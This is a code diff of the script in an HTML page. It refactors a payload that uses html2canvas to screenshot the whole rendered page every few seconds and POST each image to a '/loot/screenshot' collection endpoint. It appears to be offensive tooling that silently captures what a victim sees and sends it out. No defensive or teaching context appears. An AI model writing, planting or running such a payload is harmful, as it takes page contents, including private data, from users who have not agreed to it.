@@ -15,37 +15,38 @@
 
 	<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 	<script>
+		function sendScreenshot()
+		{
+			html2canvas(document.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
+			{
+				function responseHandler() 
+				{
+					console.log(this.responseText)
+				};
+
+				console.log("About to send image....");
+				newReq = new XMLHttpRequest();newReq.addEventListener("load", responseHandler);
+				newReq.open("POST", "//localhost:8444/loot/screenshot");
+				canvas.toBlob((blob) => 
+				{
+					const image = blob;
+					newReq.send(image);
+				});
+			}).catch(e => console.log(e));
+		}
+
+
+
 		console.log('Sleeping to allow resources loading!');
 
 		setTimeout(function () 
 		{
 			setInterval(function () 
 			{
-				html2canvas(document.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
-					{
-						function responseHandler() 
-						{
-							console.log(this.responseText)
-						};
-
-						// a = new XMLHttpRequest();a.addEventListener("load", responseHandler);
-						// a.open("POST", "//localhost:8444/loot/screenshot");
-						//a.send(btoa(canvas.toDataURL()));
-
-
-						// New stuff
-						console.log("About to send image....");
-						newReq = new XMLHttpRequest();newReq.addEventListener("load", responseHandler);
-						newReq.open("POST", "//localhost:8444/loot/screenshot");
-						canvas.toBlob((blob) => 
-						{
-							const image = blob;
-							newReq.send(image);
-						});
-						//b.send(canvas.toBlob())
-					}).catch(e => console.log(e));
-			}, 3000);
-		}, 10000);
+				console.log("Interval...");
+				sendScreenshot();
+			}, 6000);
+		}, 3000);
 
 
 
